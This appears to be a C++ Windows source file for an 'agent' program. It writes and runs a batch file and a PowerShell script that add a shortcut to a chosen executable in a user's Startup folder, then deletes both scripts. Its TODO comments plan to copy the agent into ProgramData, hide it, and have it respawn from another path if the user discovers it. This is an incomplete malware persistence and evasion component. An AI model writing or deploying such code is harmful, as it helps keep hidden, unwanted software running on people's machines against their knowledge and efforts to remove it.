#include <iostream>
#include <conio.h>
#include <string>
#include <Windows.h>
#include <fstream>



using namespace std;

/*RUN COMMAND LINE or .bat file and get output
string command = "f";
command += sourceExe;
command += "calc & notepad"; // &: run two command, &&: run if before command done
char *cmd = string_to_charstar(command);
char *output = string_to_charstar(exec(cmd));
*/


/*RUN POWERSHELL COMMAND or .bat file (can't get output)

// When using char strings
ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
// When using wchar_t strings
ShellExecuteW(NULL, L"open", L"http://www.cplusplus.com/", NULL, NULL, SW_SHOW);
// When you aren't sure
ShellExecute(NULL, TEXT("open"), TEXT("calc"), NULL, NULL, SW_SHOW);
ex:
int nRet = (int)ShellExecuteA(NULL, "open", "a.bat", NULL, NULL, SW_SHOW);
if (nRet > 32) {
//OK
//cout << "OK";


}
else {
//error

}
*/



char* string_to_charstar(string str) {

	char *cstr = new char[str.length() + 1];
	strcpy(cstr, str.c_str()); //c_str() returns const char *
	return cstr;
}

string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

int main(int argc, char* argv[]) {

	//TODO copy agent.exe in ProgramData then link to it
	//TODO hide agent.exe
	//TODO if user find agent as sturtup can fined all files so agent must run another agent in another path

	//arg[0] is filepath (C:\Temp\filename.exe)
	//arg[1] is mode

	if (argc == 3) {

		const char *fileLocation = argv[1];
		string sourceExe(fileLocation); //char* to string
		
		if (argv[2][0] == '1') {

			ofstream myfile;
			myfile.open("t.bat");
			myfile << "@echo off\n"
				"Powershell.exe -executionpolicy remotesigned -File  tt.ps1\n"
				//"set /p temp = \"Hit enter to continue\"\n"  //for dont close cmd
				"exit / b"
				;
			myfile.close();
			myfile.open("tt.ps1");
			myfile << 
				"$SourceExe = \"" 
				<< sourceExe <<
				"\"\n"
				"$DestinationPath = \"C:\\Users\\freedman\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mainprocess.lnk\"\n"
				"$WshShell = New-Object -comObject WScript.Shell\n"
				"$Shortcut = $WshShell.CreateShortcut($DestinationPath)\n"
				"$Shortcut.TargetPath = $SourceExe\n"
				"$Shortcut.Save()"
				;
			myfile.close();
			
			int nRet = (int)ShellExecuteA(NULL, "open", "t.bat", NULL, NULL, SW_SHOW);
			if (nRet > 32) {
				//OK
				//cout << "OK";
				remove("t.bat");
				remove("tt.ps1");

				cout << "1 done.";
			}
			else {
				//error
				cout << "1 failed.";
			}
			

			/*or use exec to get output
				cout << exec("t.bat");
			*/
			
			
		}
		else if (argv[2][0] == '2') {



		}

	}
	
	_getch();

	return 0;
}